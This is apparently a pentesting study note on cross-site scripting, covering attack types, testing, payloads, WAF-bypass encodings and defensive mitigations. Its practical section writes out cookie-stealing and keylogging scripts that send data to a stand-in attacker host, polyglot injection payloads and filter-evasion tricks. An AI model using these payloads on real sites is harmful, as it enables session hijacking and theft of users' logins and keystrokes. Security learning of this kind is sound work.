# XSS

Web applications can be vulnerable to **XSS (Cross-Site Scripting)** and defacement attacks if user inputs are not properly sanitized. XSS allows attackers to inject scripts, like JavaScript, that execute in victims' browsers, causing potential harm. Defacement alters the visual appearance of a website without executing code. Protect against these vulnerabilities by ensuring inputs are filtered and sanitized.

Executing arbitrary code on a victim's browser allows attackers to steal cookies, log keystrokes, or alter site appearance for phishing.

**Types of XSS Attacks**

1. **Stored XSS**: User input is saved on the website, like in user profiles or chats. Hackers can inject harmful code that affects anyone who visits the page. This is very dangerous as it affects many users without needing phishing.
2. **Reflected XSS**: User input is not stored but reflected back in web responses, often seen in search forms or URLs. Attackers trick users into clicking on malicious links, often requiring phishing.
3. **DOM-Based XSS**: Unlike stored and reflected, this affects the client side, using JavaScript to exploit vulnerabilities when dynamically rendering a page. It temporarily reflects user input, similar to reflected XSS.

## XSS Types

### Reflected

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

#### Testing for Refrected XSS:

You'll need to test **every possible point** of entry; these include:

* **Parameters** in the URL Query String
* URL File **Path**
* Sometimes **HTTP Headers** (although unlikely exploitable in practice)



### Stored

The XSS payload is saved on the web application, like in a database, and gets executed when other users visit the site or page.

<details>

<summary>Example Scenario</summary>

A blog site lets users post comments, but it doesn't check for harmful JavaScript. If you post a comment with JavaScript, it's stored in the database, and any user visiting the article will have that JavaScript run on their browser. This is risky because the JavaScript could redirect users to another site, steal session cookies, or perform actions on the site pretending to be the user.\
\
Developers often rely on client-side restrictions to protect input values. However, changing values to unexpected ones can reveal vulnerabilities, like stored XSS. For instance, if an age field expects an integer from a dropdown, you can manually send a request to test with malicious inputs.

</details>

#### Testing for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

* Comments on a blog
* User profile information
* Website Listings



### Blind XSS

**Blind XSS** works like stored XSS because your script is saved on the site for others to see. However, you can't view or test it yourself before it affects another user.

<details>

<summary>Example Scenario</summary>

A website has a contact form to message staff. The form doesn't check for harmful code, allowing attackers to enter anything. These messages turn into support tickets for staff in a private portal.\
\
An attacker can use JavaScript to send information back to their website. This could reveal the staff portal's URL, the staff member's cookies, and the contents of the portal page. With this information, the attacker could hijack the staff member's session and access the private portal.

</details>

#### Testing for Blind XSS

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.



### DOM Based

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

<details>

<summary>Example Scenario</summary>

The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

</details>

#### Testing for DOM Based XSS:

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**`window.location.x`**" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.



## Practical XSS

### Session Stealing

To steal a user's session, a hacker can use JavaScript to grab the user's cookies, encode them in base64 for safe transfer, and send them to a controlled website. With these cookies, the hacker can impersonate the user and access their session.

```javascript
<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
<img src="https://hacker.com/steal?cookie=' + btoa(document.cookie)'" />
```

{% hint style="info" %}
Some WAF filter can block the string `document.cookie`, to bypass this we can use this alternative: `document["cookie"]` .
{% endhint %}

### Key Logger

The code below is a key logger. It sends everything you type on a website to a hacker's site. This is dangerous if the site collects logins or payment information.

{% code overflow="wrap" %}
```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
```
{% endcode %}

### Business Logic

Here's a more detailed example than before. This involves calling a network resource or a JavaScript function. For instance, to change a user's email, you might have a function like `user.changeEmail()`. Your payload might look like this:

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Now that the email address for the account has changed, the attacker may perform a reset password attack.



## XSS Payloads

```
<script>alert(1);</script>
"><script>alert(1);</script>
</textarea><script>alert(1);</script> 
</script><script>alert(1);</script>
<sscriptcript>alert(1);</sscriptcript>
" onload="alert(1);
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```



## Bypass WAF&#x20;

<pre class="language-javascript" data-title="Base64 Encoding"><code class="lang-javascript"><strong>btoa("alert(1)");  // Encodes to Base64
</strong>atob("YWxlcnQoMSk=");  // Decodes Base64 back to "alert(1)"
</code></pre>

{% code title="Octal and Hexadecimal Encoding" overflow="wrap" %}
```javascript
\\141\\154\\145\\162\\164(1);  // Octal for "alert(1)"
\\x61\\x6c\\x65\\x72\\x74(1);  // Hex for "alert(1)"
```
{% endcode %}

{% code title="Unicode Escaping" %}
```javascript
al\\u0065rt(1);  // "alert(1)" using Unicode
```
{% endcode %}

{% code title="Decimal Encoding" %}
```javascript
String.fromCharCode(97, 108, 101, 114, 116)(1);  // Outputs "alert(1)"
```
{% endcode %}

{% code title="String Concatenation" %}
```javascript
var a = "al";
var b = "ert(1)";
a.concat(b);  // Outputs "alert(1)"
```
{% endcode %}



## XSS Exploitation tools

{% embed url="https://github.com/s0md3v/XSStrike" %}

{% content-ref url="../../../../../tools/web-tools/xsser.md" %}
[xsser.md](../../../../../tools/web-tools/xsser.md)
{% endcontent-ref %}



## Mitigations (TO REVIEW)

**Cross-Site Scripting (XSS)** occurs when untrusted data is interpreted as code in a browser, allowing attackers to execute arbitrary JavaScript. To defend against XSS, developers must ensure that user input is properly **sanitized, encoded, or avoided** entirely where possible.

**1. Output Encoding / Escaping**

Always encode user-generated content **before rendering it into the HTML, JavaScript, or attributes**. This prevents malicious scripts from being executed by the browser.

<details>

<summary>HTLM Encoding Python (Jinja2 template)</summary>

```html
<!-- Unsafe -->
<div>{{ user_input | safe }}</div>

<!-- Safe -->
<div>{{ user_input }}</div>  <!-- auto-escaped by default in Jinja2 -->
```

</details>

<details>

<summary>JavaScript context (React escapes by default)</summary>

```javascript
// Safe: React escapes props by default
<p>{userInput}</p>

// Unsafe: dangerouslySetInnerHTML allows XSS if input is not sanitized
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

</details>

{% hint style="info" %}
**Note:** Always escape according to the output context:

* HTML body → escape `<`, `>`, `&`, `"`
* HTML attributes → additionally escape `'`
* JavaScript context → escape quotes and backslashes
* URLs → URL-encode parameters
{% endhint %}

**2. Input Validation & Sanitization**

While encoding is the first line of defense, input validation can help **reduce the attack surface** by rejecting clearly malicious inputs early.

<details>

<summary>Allow-list filtering for usernames (Python)</summary>

```python
import re

def is_valid_username(input):
    return re.match(r'^[a-zA-Z0-9_]{3,20}$', input) is not None
```

</details>

<details>

<summary>JavaScript (DOMPurify)</summary>

```java
import DOMPurify from 'dompurify';

const cleanHtml = DOMPurify.sanitize(userInput);
document.getElementById("output").innerHTML = cleanHtml;
```

</details>



**3. Use Secure Framework Defaults**

Modern frameworks like **React, Angular, Django**, and **Rails** include XSS protections by default. Avoid disabling them unless absolutely necessary.

**Examples of secure-by-default behavior:**

* React automatically escapes props
* Django auto-escapes variables in templates
* Angular sanitizes HTML bindings (`[innerHtml]`)

**⚠️ Avoid:**

```html
htmlCopiaModifica<!-- Dangerous: exposes app to XSS -->
<div id="output">{{ user_input | safe }}</div>
```

***

**4. Content Security Policy (CSP)**

A **Content Security Policy** reduces XSS impact by restricting which scripts can be executed.

**✅ Example: HTTP header**

```http
hCopiaModificaContent-Security-Policy: default-src 'self'; script-src 'self'
```

A strong CSP can block inline scripts and third-party sources, mitigating many XSS vectors even if escaping fails.



## Resources

{% embed url="https://rootast.medium.com/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02" %}
